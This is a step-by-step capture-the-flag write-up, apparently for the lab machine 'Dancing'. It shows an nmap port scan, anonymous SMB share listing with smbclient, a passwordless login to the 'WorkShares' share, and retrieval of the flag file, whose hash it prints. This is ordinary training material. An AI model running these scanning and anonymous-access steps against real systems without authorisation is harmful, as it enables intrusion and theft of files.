![Dancing.png](/assets/Tier-0/Dancing/dancing.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.220.36
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.220.36
```

**Output**
```bash
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```
> To attack **445** port.

3. Connect with **smbcliente**
```bash
┌──(root㉿kali)-[/home/kali]
└─| smbclient -L 10.129.220.36
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.220.36 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

+ Use a **Sharename** without `$`
+ We use this to login without password.


4. Login with **smblclient** to **WorkShare**
```bash
┌──(root㉿kali)-[/home/kali]
└─| smbclient \\\\10.129.220.36\\WorkShares
Password for [WORKGROUP\root]:
```
* Leave blank the **password field** 



5. Entry to **James.P** directory and get the **flag.txt** file.
```bash
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1732519 blocks available
smb: \James.P\> get flag.txt
```

6. Go to path **/home/kali** list files and read `flag.txt` 
```bash
┌──(kali㉿kali)-[~]
└─$ cat flag.txt 
5f61c10dffbc77a704d76016a22f1664 

```

**By: EsT**